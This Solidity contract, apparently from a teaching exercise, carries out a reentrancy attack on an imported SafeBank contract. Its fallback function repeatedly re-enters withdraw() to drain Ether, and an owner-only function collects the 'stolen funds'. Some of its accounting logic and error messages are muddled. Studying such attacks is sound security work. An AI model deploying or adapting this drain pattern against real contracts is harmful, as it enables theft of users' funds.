// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//import "./VulnerableContract.sol";
import "./SafeBank.sol";

contract AttackerSafeBank {
    mapping(address => uint256) public balances;
    //VulnerableContract public vulnerable;
    SafeBank public vulnerable;
    address public owner;
    uint256 public targetAmount;  // Amount to drain
    uint256 public drainedAmount;  // Amount already drained
    uint256 public prevBalanceVulnerableContract=0;  // Amount to drain
    uint256 public totalWithdraw; //targetAmount - drainedAmount;

    constructor(address payable _vulnerableAddress) {
        //vulnerable = VulnerableContract(_vulnerableAddress);
        vulnerable = SafeBank(_vulnerableAddress);
        owner = msg.sender;
    }

    // Fallback function for reentrancy
    fallback() external payable {
        //uint256 vulnBalance = prevBalanceVulnerableContract; //address(vulnerable).balance;
        
       // uint256 attackBalance = address(this).balance;
        if (totalWithdraw <= targetAmount && totalWithdraw <= prevBalanceVulnerableContract) {
            
            
            if (totalWithdraw == prevBalanceVulnerableContract) {
                totalWithdraw = prevBalanceVulnerableContract;  // Cap withdrawal to remaining balance
            } else {
                totalWithdraw += drainedAmount;
            }
            //drainedAmount += amountToWithdraw;
            
            //prevBalanceVulnerableContract -= drainedAmount;
            if (drainedAmount>0) {
                vulnerable.withdraw(drainedAmount);
              }  // Reenter to withdraw
            
        }
    }

    // Initiate the attack with a specific target amount
    function attack(uint256 _targetAmount) external payable {
        uint256 balVulnerable; 
        
        require(msg.value < _targetAmount, "Need to send some Ether to attack less than target amount");

        balVulnerable = address(vulnerable).balance;
        require(_targetAmount <= balVulnerable, "Target amount must be less than balance of vulnerable contract");
        
        targetAmount = _targetAmount;
        drainedAmount = totalWithdraw = msg.value;
        

        // Deposit initial amount to vulnerable contract
        vulnerable.deposit{value: msg.value}();

        prevBalanceVulnerableContract = address(vulnerable).balance;

        // Start reentrancy attack with the initial deposit
        vulnerable.withdraw(msg.value);  // Start by withdrawing the initial deposit
    }

    // Withdraw stolen funds
    function withdrawFunds() external {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }

     // Function to allow the contract to receive Ether
    function deposit() external payable {
        // Function to handle incoming Ether
    }
   
}
